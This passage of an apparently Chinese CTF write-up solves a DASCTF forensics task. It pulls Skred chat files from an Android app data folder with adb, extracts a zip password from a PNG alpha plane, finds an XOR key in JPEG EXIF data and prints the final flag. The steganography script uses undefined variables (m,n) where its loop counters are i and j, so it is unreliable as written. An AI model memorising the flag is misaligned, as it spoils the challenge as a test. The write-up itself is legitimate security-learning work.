<p>发现聊天记录传输了⽂件，根据skred的存储文件的位置，可以直接定位</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/data/</span>data<span class="regexp">/mobi.skred.app/</span>files/conversations</span><br></pre></td></tr></table></figure>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204032727182.png" alt="image-20230204032727182"></p>
<p>使⽤adb pull来提取⽂件</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">adb pull /data/data/mobi.skred.app/files/conversations/9f817126-eabd-4c5c-<span class="number">9b47</span>-bebe04545ba0/<span class="number">50.</span>zip D:\桌面\CTF\西湖论剑<span class="number">2023</span>\jntm-update\dasctf</span><br></pre></td></tr></table></figure>
<p>其他文件类似操作提取即可</p>
<p>解压压缩包发现存在解压密码，可能存在两张图片里，图片可能采取了隐写之类的隐藏信息的方式</p>
<p>使用stegslove打开45.png，在Alpha plane处发现信息，写脚本提取其二进制信息</p>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204033851762.png" alt="image-20230204033851762"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&quot;45.png&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(img.width):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(img.height):</span><br><span class="line">        pixl = img.getpixel((m,n))</span><br><span class="line">        <span class="keyword">if</span>(pixl[<span class="number">3</span>] == <span class="number">255</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="number">1</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="number">0</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;_______________&quot;</span>) </span><br><span class="line"><span class="comment">#0110010100110000001100010011010100110100001101000110000100111001001100110011001100110011011001010110011000110110001100100110000100110011011000010110000100110010001101110011001100110101001101110110010101100010001101010011001001100101011000010011100001100001</span></span><br></pre></td></tr></table></figure>
<p>进行编码转换一下</p>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204034628556.png" alt="image-20230204034628556"></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">e01544a9333ef62a3aa27357eb52ea8a</span><br></pre></td></tr></table></figure>
<p>得到解压密码，解压50.zip，获得一个flag文件，记事本打开为一串乱码，猜测可能是啥加密，信息应该在75.jpg上面</p>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204034838826.png" alt="image-20230204034838826"></p>
<p>根据赛方放出的hint3：在线exif</p>
<p>试着查看一下75.jpg的exif信息，这里我使用的是<a href="https://exif.tuchong.com/">EXIF信息查看器 (tuchong.com)</a></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">EXIF信息摘要</span></span><br><span class="line"><span class="string">模式</span>	<span class="string">曝光模式:Aperture-priority</span> <span class="string">AE,</span> <span class="string">测光模式:Multi-segment,</span> <span class="string">曝光补偿:0</span></span><br><span class="line"><span class="string">曝光</span>	<span class="string">光圈:4.0,</span> <span class="string">快门:1/250秒,</span> <span class="string">ISO200</span></span><br><span class="line"><span class="string">焦距</span>	<span class="number">50.0</span> <span class="string">mm</span> <span class="string">(35</span> <span class="attr">mm equivalent:</span> <span class="number">80.9</span> <span class="string">mm),</span> <span class="string">视角:25.1</span> <span class="string">deg</span></span><br><span class="line"><span class="string">色彩</span>	<span class="string">白平衡:Auto,</span> <span class="string">色彩空间:sRGB</span></span><br><span class="line"><span class="string">File</span></span><br><span class="line"><span class="string">FileType</span>	<span class="string">JPEG</span></span><br><span class="line"><span class="string">FileTypeExtension</span>	<span class="string">jpg</span></span><br><span class="line"><span class="string">MIMEType</span>	<span class="string">image/jpeg</span></span><br><span class="line"><span class="string">ExifByteOrder</span>	<span class="string">Little-endian</span> <span class="string">(Intel,</span> <span class="string">II)</span></span><br><span class="line"><span class="string">ImageWidth</span>	<span class="number">3888</span></span><br><span class="line"><span class="string">ImageHeight</span>	<span class="number">2592</span></span><br><span class="line"><span class="string">EncodingProcess</span>	<span class="string">Baseline</span> <span class="string">DCT,</span> <span class="string">Huffman</span> <span class="string">coding</span></span><br><span class="line"><span class="string">BitsPerSample</span>	<span class="number">8</span></span><br><span class="line"><span class="string">ColorComponents</span>	<span class="number">3</span></span><br><span class="line"><span class="string">YCbCrSubSampling</span>	<span class="string">YCbCr4:2:2</span> <span class="string">(2</span> <span class="number">1</span><span class="string">)</span></span><br><span class="line"><span class="string">IFD0</span></span><br><span class="line"><span class="string">方向</span>	<span class="string">Horizontal</span> <span class="string">(normal)</span></span><br><span class="line"><span class="string">X分辨率</span>	<span class="number">72</span></span><br><span class="line"><span class="string">Y分辨率</span>	<span class="number">72</span></span><br><span class="line"><span class="string">分辨率单位</span>	<span class="string">inches</span></span><br><span class="line"><span class="string">YCbCr定位</span>	<span class="string">Co-sited</span></span><br><span class="line"><span class="string">ExifIFD</span></span><br><span class="line"><span class="string">曝光时间</span>	<span class="number">1</span><span class="string">/250</span></span><br><span class="line"><span class="string">光圈值</span>	<span class="number">4.0</span></span><br><span class="line"><span class="string">曝光程序</span>	<span class="string">Aperture-priority</span> <span class="string">AE</span></span><br><span class="line"><span class="string">ISO</span>	<span class="number">200</span></span><br><span class="line"><span class="string">Exif版本</span>	<span class="number">0221</span></span><br><span class="line"><span class="string">ComponentsConfiguration</span>	<span class="string">Y,</span> <span class="string">Cb,</span> <span class="string">Cr,</span> <span class="bullet">-</span></span><br><span class="line"><span class="string">快门速度值</span>	<span class="number">1</span><span class="string">/250</span></span><br><span class="line"><span class="string">光圈值</span>	<span class="number">4.0</span></span><br><span class="line"><span class="string">曝光补偿</span>	<span class="number">0</span></span><br><span class="line"><span class="string">测光模式</span>	<span class="string">Multi-segment</span></span><br><span class="line"><span class="string">闪光灯</span>	<span class="string">Off,</span> <span class="string">Did</span> <span class="string">not</span> <span class="string">fire</span></span><br><span class="line"><span class="string">焦距</span>	<span class="number">50.0</span> <span class="string">mm</span></span><br><span class="line"><span class="string">用户注释</span>	<span class="string">XOR</span> <span class="string">DASCTF2022</span></span><br><span class="line"><span class="string">SubSecTime</span>	<span class="number">39</span></span><br><span class="line"><span class="string">SubSecTime原始</span>	<span class="number">39</span></span><br><span class="line"><span class="string">SubSecTime数码化</span>	<span class="number">39</span></span><br><span class="line"><span class="string">Flashpix版本</span>	<span class="number">0100</span></span><br><span class="line"><span class="string">色彩空间</span>	<span class="string">sRGB</span></span><br><span class="line"><span class="string">Exif图像宽度</span>	<span class="number">3888</span></span><br><span class="line"><span class="string">Exif图像高度</span>	<span class="number">2592</span></span><br><span class="line"><span class="string">焦平面X轴分辨率</span>	<span class="number">4438.356164</span></span><br><span class="line"><span class="string">焦平面Y轴分辨率</span>	<span class="number">4445.969125</span></span><br><span class="line"><span class="string">焦平面分辨率单位</span>	<span class="string">inches</span></span><br><span class="line"><span class="string">CustomRendered</span>	<span class="string">Normal</span></span><br><span class="line"><span class="string">曝光模式</span>	<span class="string">Auto</span></span><br><span class="line"><span class="string">白平衡</span>	<span class="string">Auto</span></span><br><span class="line"><span class="string">场景Capture类型</span>	<span class="string">Standard</span></span><br><span class="line"><span class="string">InteropIFD</span></span><br><span class="line"><span class="string">Interop索引</span>	<span class="string">R98</span> <span class="bullet">-</span> <span class="string">DCF</span> <span class="string">basic</span> <span class="string">file</span> <span class="string">(sRGB)</span></span><br><span class="line"><span class="string">Interop版本</span>	<span class="number">0100</span></span><br><span class="line"><span class="string">IFD1</span></span><br><span class="line"><span class="string">压缩</span>	<span class="string">JPEG</span> <span class="string">(old-style)</span></span><br><span class="line"><span class="string">X分辨率</span>	<span class="number">72</span></span><br><span class="line"><span class="string">Y分辨率</span>	<span class="number">72</span></span><br><span class="line"><span class="string">分辨率单位</span>	<span class="string">inches</span></span><br><span class="line"><span class="string">缩略图偏移</span>	<span class="number">8412</span></span><br><span class="line"><span class="string">缩略图长度</span>	<span class="number">19629</span></span><br><span class="line"><span class="string">ThumbnailImage</span>	<span class="string">(Binary</span> <span class="string">data</span> <span class="number">19629</span> <span class="string">bytes,</span> <span class="string">use</span> <span class="string">-b</span> <span class="string">option</span> <span class="string">to</span> <span class="string">extract)</span></span><br><span class="line"><span class="string">Composite</span></span><br><span class="line"><span class="string">光圈</span>	<span class="number">4.0</span></span><br><span class="line"><span class="string">图像尺寸</span>	<span class="string">3888x2592</span></span><br><span class="line"><span class="string">Megapixels</span>	<span class="number">10.1</span></span><br><span class="line"><span class="string">35mm等效因子</span>	<span class="number">1.6</span></span><br><span class="line"><span class="string">快门速度</span>	<span class="number">1</span><span class="string">/250</span></span><br><span class="line"><span class="string">(最小)模糊圈</span>	<span class="number">0.019</span> <span class="string">mm</span></span><br><span class="line"><span class="string">视角</span>	<span class="number">25.1</span> <span class="string">deg</span></span><br><span class="line"><span class="string">35mm等效焦距</span>	<span class="number">50.0</span> <span class="string">mm</span> <span class="string">(35</span> <span class="attr">mm equivalent:</span> <span class="number">80.9</span> <span class="string">mm)</span></span><br><span class="line"><span class="string">超焦距</span>	<span class="number">33.67</span> <span class="string">m</span></span><br><span class="line"><span class="string">亮度值</span>	<span class="number">11.0</span></span><br></pre></td></tr></table></figure>
<p>可以看到用户注释为<code>XOR DASCTF2022</code></p>
<p>对flag文件进行XOR</p>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204035735656.png" alt="image-20230204035735656"></p>
<p>获得flag：DASCTF{fe089fecf73daa9dcba9bc385df54605}</p>
<h1 id="写在后面"><a class="markdownIt-Anchor" href="#写在后面"></a> #写在后面</h1>
<p>这次比赛全程投入，做的很累，不过收获还是很大的，也很遗憾，一个学校只能进入决赛一只队伍，想去线下和很多师傅见面的，这次是没机会去杭州了，不过能去线下的机会多着呢！不急，认识蛮久了，就差线下瞅瞅了哈哈哈哈</p>
]]></content>
      <categories>
        <category>赛事Writeup</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Web</tag>
        <tag>Misc</tag>
      </tags>
  </entry>
</search>
